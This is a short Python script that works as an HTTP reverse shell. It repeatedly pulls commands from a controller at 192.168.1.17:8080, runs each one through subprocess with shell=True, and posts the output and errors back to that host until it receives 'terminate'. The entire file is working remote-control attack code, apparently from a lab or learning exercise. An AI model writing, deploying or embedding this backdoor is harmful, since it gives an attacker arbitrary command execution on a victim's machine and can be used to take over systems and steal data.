import requests
import subprocess
import time

while True:
    req = requests.get('http://192.168.1.17:8080')
    command = req.text

    if 'terminate' in command:
        break
    else:
        CMD = subprocess.Popen(command, shell = True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.1.17:8080', data=CMD.stdout.read())#Post the result
        post_response = requests.post(url='http://192.168.1.17:8080',data=CMD.stderr.read()) #or the error if any

        time.sleep(3)